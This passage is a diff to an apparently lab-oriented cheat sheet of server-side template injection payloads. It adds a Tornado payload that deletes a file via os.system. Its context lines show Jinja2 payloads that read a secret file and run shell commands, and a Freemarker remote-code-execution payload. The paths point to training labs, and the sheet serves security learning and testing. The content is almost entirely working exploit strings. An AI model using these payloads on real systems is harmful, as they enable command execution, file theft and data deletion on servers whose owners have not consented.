@@ -77,6 +77,7 @@ ${{7*7}}
 ## 🔥 Exploitation Payloads
 
 ### Jinja2 (Python)
+
 **Read File:**
 ```python
 {{ ''.__class__.__mro__[1].__subclasses__()[40]('/home/carlos/secret').read() }}
@@ -87,9 +88,16 @@ ${{7*7}}
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/carlos/secret').read() }}
 ```
 
+### Tornado (Python)
+
+```python
+{{__import__('os').system('bash -c "rm /home/carlos/morale.txt"')}}
+```
+
 ---
 
 ### Freemarker (Java)
+
 **RCE:**
 ```java
 <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /home/carlos/secret") }
